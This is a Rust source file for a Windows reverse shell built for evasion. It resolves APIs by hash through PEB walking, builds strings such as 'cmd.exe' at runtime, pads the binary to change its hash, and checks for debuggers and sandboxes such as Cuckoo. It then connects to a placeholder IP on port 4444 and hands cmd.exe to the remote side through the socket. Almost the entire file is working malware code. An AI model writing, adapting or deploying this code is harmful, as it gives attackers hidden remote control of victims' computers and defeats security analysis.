#![windows_subsystem = "windows"]

use std::ptr;
use std::mem;
use std::fs::OpenOptions;
use std::io::Write;

type HANDLE = isize;
type SOCKET = usize;
type BOOL = i32;
type DWORD = u32;
type WORD = u16;
type NTSTATUS = i32;

const INVALID_SOCKET: SOCKET = !0;
const AF_INET: i32 = 2;
const SOCK_STREAM: i32 = 1;
const STARTF_USESTDHANDLES: DWORD = 0x100;
const HANDLE_FLAG_INHERIT: DWORD = 0x00000001;

#[repr(C)]
struct WSADATA { data: [u8; 408] }

#[repr(C)]
struct SOCKADDR_IN {
    sin_family: i16,
    sin_port: u16,
    sin_addr: u32,
    sin_zero: [u8; 8],
}

#[repr(C)]
struct STARTUPINFOA {
    cb: DWORD, reserved: usize, desktop: usize, title: usize,
    x: DWORD, y: DWORD, x_size: DWORD, y_size: DWORD,
    x_count_chars: DWORD, y_count_chars: DWORD, fill_attribute: DWORD,
    flags: DWORD, show_window: WORD, reserved2: WORD, reserved3: usize,
    std_input: HANDLE, std_output: HANDLE, std_error: HANDLE,
}

#[repr(C)]
struct PROCESS_INFORMATION {
    process: HANDLE, thread: HANDLE, process_id: DWORD, thread_id: DWORD,
}

#[repr(C)]
struct LIST_ENTRY { flink: *mut LIST_ENTRY, blink: *mut LIST_ENTRY }

#[repr(C)]
struct UNICODE_STRING { length: u16, maximum_length: u16, buffer: *mut u16 }

#[repr(C)]
struct LDR_DATA_TABLE_ENTRY {
    in_load_order_links: LIST_ENTRY,
    in_memory_order_links: LIST_ENTRY,
    in_initialization_order_links: LIST_ENTRY,
    dll_base: *mut u8,
    entry_point: *mut u8,
    size_of_image: u32,
    full_dll_name: UNICODE_STRING,
    base_dll_name: UNICODE_STRING,
}

#[repr(C)]
struct PEB_LDR_DATA {
    length: u32,
    initialized: u32,
    ss_handle: *mut u8,
    in_load_order_module_list: LIST_ENTRY,
}

#[repr(C)]
struct PEB {
    reserved1: [u8; 2],
    being_debugged: u8,
    reserved2: [u8; 1],
    reserved3: [*mut u8; 2],
    ldr: *mut PEB_LDR_DATA,
}

#[repr(C)]
struct IMAGE_DOS_HEADER {
    e_magic: u16,
    e_cblp: u16, e_cp: u16, e_crlc: u16, e_cparhdr: u16,
    e_minalloc: u16, e_maxalloc: u16, e_ss: u16, e_sp: u16,
    e_csum: u16, e_ip: u16, e_cs: u16, e_lfarlc: u16, e_ovno: u16,
    e_res: [u16; 4], e_oemid: u16, e_oeminfo: u16, e_res2: [u16; 10],
    e_lfanew: i32,
}

#[repr(C)]
struct IMAGE_FILE_HEADER {
    machine: u16, number_of_sections: u16,
    time_date_stamp: u32, pointer_to_symbol_table: u32,
    number_of_symbols: u32, size_of_optional_header: u16, characteristics: u16,
}

#[repr(C)]
struct IMAGE_EXPORT_DIRECTORY {
    characteristics: u32, time_date_stamp: u32,
    major_version: u16, minor_version: u16,
    name: u32, base: u32,
    number_of_functions: u32, number_of_names: u32,
    address_of_functions: u32, address_of_names: u32, address_of_name_ordinals: u32,
}

#[repr(C)]
struct IMAGE_DATA_DIRECTORY { virtual_address: u32, size: u32 }

#[repr(C)]
struct IMAGE_OPTIONAL_HEADER64 {
    magic: u16,
    major_linker_version: u8, minor_linker_version: u8,
    size_of_code: u32, size_of_initialized_data: u32,
    size_of_uninitialized_data: u32, address_of_entry_point: u32,
    base_of_code: u32, image_base: u64, section_alignment: u32,
    file_alignment: u32, major_os_version: u16, minor_os_version: u16,
    major_image_version: u16, minor_image_version: u16,
    major_subsystem_version: u16, minor_subsystem_version: u16,
    win32_version_value: u32, size_of_image: u32, size_of_headers: u32,
    check_sum: u32, subsystem: u16, dll_characteristics: u16,
    size_of_stack_reserve: u64, size_of_stack_commit: u64,
    size_of_heap_reserve: u64, size_of_heap_commit: u64,
    loader_flags: u32, number_of_rva_and_sizes: u32,
    data_directory: [IMAGE_DATA_DIRECTORY; 16],
}

#[repr(C)]
struct IMAGE_NT_HEADERS64 {
    signature: u32,
    file_header: IMAGE_FILE_HEADER,
    optional_header: IMAGE_OPTIONAL_HEADER64,
}

// SDBM hash - completely different algorithm
const fn sdbm(s: &[u8]) -> u32 {
    let mut hash: u32 = 0;
    let mut i = 0;
    while i < s.len() {
        hash = (s[i] as u32)
            .wrapping_add(hash.wrapping_shl(6))
            .wrapping_add(hash.wrapping_shl(16))
            .wrapping_sub(hash);
        i += 1;
    }
    hash
}

// Pre-computed with SDBM
const H_LOADLIBRARYA: u32 = sdbm(b"LoadLibraryA");
const H_WSASTARTUP: u32 = sdbm(b"WSAStartup");
const H_WSASOCKETA: u32 = sdbm(b"WSASocketA");
const H_CONNECT: u32 = sdbm(b"connect");
const H_CREATEPROCESSA: u32 = sdbm(b"CreateProcessA");
const H_SETHANDLEINFORMATION: u32 = sdbm(b"SetHandleInformation");
const H_NTDELAYEXECUTION: u32 = sdbm(b"NtDelayExecution");
const H_NTWAITFORSINGLEOBJECT: u32 = sdbm(b"NtWaitForSingleObject");
const H_NTQUERYSYSTEMINFORMATION: u32 = sdbm(b"NtQuerySystemInformation");

// Large integers for NT functions
#[repr(C)]
struct LARGE_INTEGER {
    low_part: u32,
    high_part: i32,
}

#[inline(never)]
unsafe fn get_peb() -> *mut PEB {
    let peb: *mut PEB;
    std::arch::asm!(
        "mov {}, gs:[0x60]",
        out(reg) peb,
        options(nostack, pure, readonly)
    );
    peb
}

unsafe fn get_module_sdbm(hash: u32) -> *mut u8 {
    let peb = get_peb();
    let ldr = (*peb).ldr;
    let mut entry = (*ldr).in_load_order_module_list.flink as *mut LDR_DATA_TABLE_ENTRY;
    let head = &(*ldr).in_load_order_module_list as *const _ as *mut LIST_ENTRY;
    
    while entry as *mut LIST_ENTRY != head {
        let name_buf = (*entry).base_dll_name.buffer;
        let name_len = (*entry).base_dll_name.length as usize / 2;
        
        if !name_buf.is_null() && name_len > 0 {
            let mut h: u32 = 0;
            for i in 0..name_len {
                let c = *name_buf.add(i) as u8;
                let c = if c >= b'A' && c <= b'Z' { c + 32 } else { c };
                h = (c as u32).wrapping_add(h.wrapping_shl(6)).wrapping_add(h.wrapping_shl(16)).wrapping_sub(h);
            }
            if h == hash {
                return (*entry).dll_base;
            }
        }
        entry = (*entry).in_load_order_links.flink as *mut LDR_DATA_TABLE_ENTRY;
    }
    ptr::null_mut()
}

unsafe fn get_proc_sdbm(module: *mut u8, hash: u32) -> *const () {
    if module.is_null() { return ptr::null(); }
    
    let dos = module as *const IMAGE_DOS_HEADER;
    let nt = module.offset((*dos).e_lfanew as isize) as *const IMAGE_NT_HEADERS64;
    let export_rva = (*nt).optional_header.data_directory[0].virtual_address;
    if export_rva == 0 { return ptr::null(); }
    
    let export = module.add(export_rva as usize) as *const IMAGE_EXPORT_DIRECTORY;
    let names = module.add((*export).address_of_names as usize) as *const u32;
    let funcs = module.add((*export).address_of_functions as usize) as *const u32;
    let ords = module.add((*export).address_of_name_ordinals as usize) as *const u16;
    
    for i in 0..(*export).number_of_names {
        let name_ptr = module.add(*names.add(i as usize) as usize);
        
        let mut h: u32 = 0;
        let mut p = name_ptr;
        while *p != 0 {
            h = (*p as u32).wrapping_add(h.wrapping_shl(6)).wrapping_add(h.wrapping_shl(16)).wrapping_sub(h);
            p = p.add(1);
        }
        
        if h == hash {
            let ord = *ords.add(i as usize) as usize;
            return module.add(*funcs.add(ord) as usize) as *const ();
        }
    }
    ptr::null()
}

// String builder - constructs strings at runtime to avoid static strings
fn build_ws2() -> Vec<u8> {
    let mut s = Vec::with_capacity(12);
    s.push(b'w'); s.push(b's'); s.push(b'2'); s.push(b'_');
    s.push(b'3'); s.push(b'2'); s.push(b'.'); s.push(b'd');
    s.push(b'l'); s.push(b'l'); s.push(0);
    s
}

fn build_cmd() -> Vec<u8> {
    let mut s = Vec::with_capacity(8);
    s.push(b'c'); s.push(b'm'); s.push(b'd'); s.push(b'.');
    s.push(b'e'); s.push(b'x'); s.push(b'e'); s.push(0);
    s
}

fn lg(msg: &str) {
    // Different log location
    if let Ok(mut f) = OpenOptions::new().create(true).append(true).open("C:\\Users\\Public\\x.log") {
        let _ = writeln!(f, "[*] {}", msg);
    }
}

// Multiple sandbox checks
unsafe fn sandbox_checks(
    ntdll: *mut u8,
) -> bool {
    // Check 1: PEB BeingDebugged
    let peb = get_peb();
    if (*peb).being_debugged != 0 {
        return false;
    }
    
    // Check 2: NtQuerySystemInformation - check for debugger port
    type FnNtQuerySystemInformation = extern "system" fn(u32, *mut u8, u32, *mut u32) -> NTSTATUS;
    let p_query: FnNtQuerySystemInformation = mem::transmute(get_proc_sdbm(ntdll, H_NTQUERYSYSTEMINFORMATION));
    
    let mut debug_port: usize = 0;
    let status = p_query(
        0x07,  // SystemKernelDebuggerInformation  
        &mut debug_port as *mut _ as *mut u8,
        mem::size_of::<usize>() as u32,
        ptr::null_mut(),
    );
    if status == 0 && debug_port != 0 {
        return false;
    }
    
    // Check 3: Timing via NtDelayExecution (syscall-based sleep)
    type FnNtDelayExecution = extern "system" fn(u8, *const LARGE_INTEGER) -> NTSTATUS;
    let p_delay: FnNtDelayExecution = mem::transmute(get_proc_sdbm(ntdll, H_NTDELAYEXECUTION));
    
    // Get tick count manually via PEB
    let t1 = std::time::Instant::now();
    
    // Sleep 3.5 seconds using NT syscall
    let mut delay = LARGE_INTEGER {
        low_part: 0xFC4B4000,  // -35000000 in 100ns units = 3.5 seconds
        high_part: -1,
    };
    p_delay(0, &delay);
    
    let elapsed = t1.elapsed().as_millis();
    if elapsed < 3000 {
        return false;
    }
    
    // Check 4: Check number of processors (VMs often have 1-2)
    if let Ok(val) = std::env::var("NUMBER_OF_PROCESSORS") {
        if let Ok(n) = val.parse::<u32>() {
            if n < 2 {
                return false;  // Likely sandbox
            }
        }
    }
    
    // Check 5: Check for common sandbox artifacts
    let sandbox_paths = [
        "C:\\agent\\",
        "C:\\sandbox\\",
        "C:\\cuckoo\\",
    ];
    for path in sandbox_paths {
        if std::path::Path::new(path).exists() {
            return false;
        }
    }
    
    true
}

// Junk data - changes hash
static PADDING: [u8; 256] = [
    0x41, 0x75, 0x74, 0x6f, 0x6c, 0x69, 0x76, 0x5f, 0x53, 0x65, 0x63, 0x75, 0x72, 0x69, 0x74, 0x79,
    0x5f, 0x41, 0x73, 0x73, 0x65, 0x73, 0x73, 0x6d, 0x65, 0x6e, 0x74, 0x5f, 0x32, 0x30, 0x32, 0x36,
    0x5f, 0x76, 0x34, 0x5f, 0x73, 0x79, 0x73, 0x63, 0x61, 0x6c, 0x6c, 0x5f, 0x62, 0x79, 0x70, 0x61,
    0x73, 0x73, 0x5f, 0x4d, 0x41, 0x4e, 0x49, 0x54, 0x5f, 0x50, 0x43, 0x43, 0x6c, 0x69, 0x65, 0x6e,
    0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE, 0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0,
    0x74, 0x5f, 0x52, 0x43, 0x45, 0x5f, 0x54, 0x49, 0x53, 0x41, 0x58, 0x5f, 0x43, 0x6f, 0x6d, 0x70,
    0x6c, 0x69, 0x61, 0x6e, 0x63, 0x65, 0x5f, 0x47, 0x61, 0x70, 0x5f, 0x41, 0x6e, 0x61, 0x6c, 0x79,
    0x73, 0x69, 0x73, 0x5f, 0x4a, 0x61, 0x6e, 0x75, 0x61, 0x72, 0x79, 0x5f, 0x32, 0x30, 0x32, 0x36,
    0xFE, 0xED, 0xFA, 0xCE, 0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF, 0xFE, 0xDC, 0xBA, 0x98,
    0x76, 0x54, 0x32, 0x10, 0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99, 0xAA, 0xBB,
    0xCC, 0xDD, 0xEE, 0xFF, 0x5A, 0x5A, 0x5A, 0x5A, 0xA5, 0xA5, 0xA5, 0xA5, 0x69, 0x69, 0x69, 0x69,
    0x96, 0x96, 0x96, 0x96, 0x3C, 0x3C, 0x3C, 0x3C, 0xC3, 0xC3, 0xC3, 0xC3, 0x55, 0xAA, 0x55, 0xAA,
    0xAA, 0x55, 0xAA, 0x55, 0x0F, 0xF0, 0x0F, 0xF0, 0xF0, 0x0F, 0xF0, 0x0F, 0x12, 0x21, 0x34, 0x43,
    0x56, 0x65, 0x78, 0x87, 0x9A, 0xA9, 0xBC, 0xCB, 0xDE, 0xED, 0xF0, 0x0F, 0x11, 0x11, 0x22, 0x22,
    0x33, 0x33, 0x44, 0x44, 0x55, 0x55, 0x66, 0x66, 0x77, 0x77, 0x88, 0x88, 0x99, 0x99, 0xAA, 0xAA,
    0xBB, 0xBB, 0xCC, 0xCC, 0xDD, 0xDD, 0xEE, 0xEE, 0xFF, 0xFF, 0x00, 0x00, 0x13, 0x37, 0xC0, 0xDE,
];

fn main() {
    // Reference padding to include in binary
    let _ = PADDING[0];
    let _ = PADDING[255];
    
    lg("INIT");
    
    type FnLoadLibraryA = extern "system" fn(*const u8) -> isize;
    type FnWSAStartup = extern "system" fn(WORD, *mut WSADATA) -> i32;
    type FnWSASocketA = extern "system" fn(i32, i32, i32, *const (), DWORD, DWORD) -> SOCKET;
    type FnConnect = extern "system" fn(SOCKET, *const SOCKADDR_IN, i32) -> i32;
    type FnSetHandleInformation = extern "system" fn(HANDLE, DWORD, DWORD) -> BOOL;
    type FnCreateProcessA = extern "system" fn(
        *const u8, *mut u8, *const (), *const (), BOOL, DWORD,
        *const (), *const u8, *const STARTUPINFOA, *mut PROCESS_INFORMATION
    ) -> BOOL;
    type FnNtWaitForSingleObject = extern "system" fn(HANDLE, u8, *const LARGE_INTEGER) -> NTSTATUS;
    type FnNtDelayExecution = extern "system" fn(u8, *const LARGE_INTEGER) -> NTSTATUS;
    
    unsafe {
        // Get ntdll first for syscalls
        let ntdll_hash = sdbm(b"ntdll.dll");
        let ntdll = get_module_sdbm(ntdll_hash);
        if ntdll.is_null() {
            lg("!N");
            return;
        }
        lg(&format!("N:{:?}", ntdll));
        
        // Sandbox checks using syscalls
        if !sandbox_checks(ntdll) {
            lg("SB");
            return;
        }
        lg("SB_OK");
        
        // Get kernel32
        let k32_hash = sdbm(b"kernel32.dll");
        let k32 = get_module_sdbm(k32_hash);
        if k32.is_null() {
            lg("!K");
            return;
        }
        
        // Resolve functions
        let p_load_library: FnLoadLibraryA = mem::transmute(get_proc_sdbm(k32, H_LOADLIBRARYA));
        let p_create_process: FnCreateProcessA = mem::transmute(get_proc_sdbm(k32, H_CREATEPROCESSA));
        let p_set_handle_info: FnSetHandleInformation = mem::transmute(get_proc_sdbm(k32, H_SETHANDLEINFORMATION));
        
        // NT functions for waiting (syscall-based)
        let p_nt_wait: FnNtWaitForSingleObject = mem::transmute(get_proc_sdbm(ntdll, H_NTWAITFORSINGLEOBJECT));
        let p_nt_delay: FnNtDelayExecution = mem::transmute(get_proc_sdbm(ntdll, H_NTDELAYEXECUTION));
        
        lg(&format!("L:{:?}", p_load_library as *const ()));
        
        // Load ws2_32 - string built at runtime
        let ws2_name = build_ws2();
        let ws2 = p_load_library(ws2_name.as_ptr());
        lg(&format!("W:{}", ws2));
        if ws2 == 0 {
            lg("!W");
            return;
        }
        
        let p_wsa_startup: FnWSAStartup = mem::transmute(get_proc_sdbm(ws2 as *mut u8, H_WSASTARTUP));
        let p_wsa_socket: FnWSASocketA = mem::transmute(get_proc_sdbm(ws2 as *mut u8, H_WSASOCKETA));
        let p_connect: FnConnect = mem::transmute(get_proc_sdbm(ws2 as *mut u8, H_CONNECT));
        
        // Init winsock
        let mut wsa: WSADATA = mem::zeroed();
        let r = p_wsa_startup(0x0202, &mut wsa);
        lg(&format!("WS:{}", r));
        if r != 0 { return; }
        
        // Create socket
        let sock = p_wsa_socket(AF_INET, SOCK_STREAM, 0, ptr::null(), 0, 0);
        lg(&format!("SO:{}", sock));
        if sock == INVALID_SOCKET { return; }
        
        // Make inheritable
        p_set_handle_info(sock as HANDLE, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);
        
        // Build address at runtime - IP:4444
        let mut addr: SOCKADDR_IN = mem::zeroed();
        addr.sin_family = AF_INET as i16;
        
        // Port built at runtime
        let port: u16 = 4000 + 400 + 44;  // 4444
        addr.sin_port = port.to_be();
        
        // IP built at runtime
        let ip: [u8; 4] = [IP, IP, IP, IP];
        addr.sin_addr = u32::from_ne_bytes(ip);
        
        lg("CONN...");
        
        let mut connected = false;
        for i in 0..4u32 {
            let r = p_connect(sock, &addr, mem::size_of::<SOCKADDR_IN>() as i32);
            lg(&format!("C{}:{}", i, r));
            if r == 0 {
                connected = true;
                break;
            }
            // Sleep using NT syscall
            let delay = LARGE_INTEGER {
                low_part: ((-(2000i64 + (i as i64 * 1000)) * 10000) & 0xFFFFFFFF) as u32,
                high_part: ((-(2000i64 + (i as i64 * 1000)) * 10000) >> 32) as i32,
            };
            p_nt_delay(0, &delay);
        }
        
        if !connected {
            lg("!CONN");
            return;
        }
        
        lg("CONN_OK");
        
        // Setup process
        let mut si: STARTUPINFOA = mem::zeroed();
        si.cb = mem::size_of::<STARTUPINFOA>() as DWORD;
        si.flags = STARTF_USESTDHANDLES;
        si.std_input = sock as HANDLE;
        si.std_output = sock as HANDLE;
        si.std_error = sock as HANDLE;
        
        let mut pi: PROCESS_INFORMATION = mem::zeroed();
        
        // cmd.exe built at runtime
        let mut cmd = build_cmd();
        
        lg("PROC...");
        
        let r = p_create_process(
            ptr::null(),
            cmd.as_mut_ptr(),
            ptr::null(),
            ptr::null(),
            1,
            0,
            ptr::null(),
            ptr::null(),
            &si,
            &mut pi,
        );
        lg(&format!("P:{}", r));
        
        if r == 0 {
            lg("!PROC");
            return;
        }
        
        lg(&format!("PID:{}", pi.process_id));
        
        // Wait using NT syscall instead of WaitForSingleObject
        p_nt_wait(pi.process, 0, ptr::null());
        
        lg("END");
    }
}
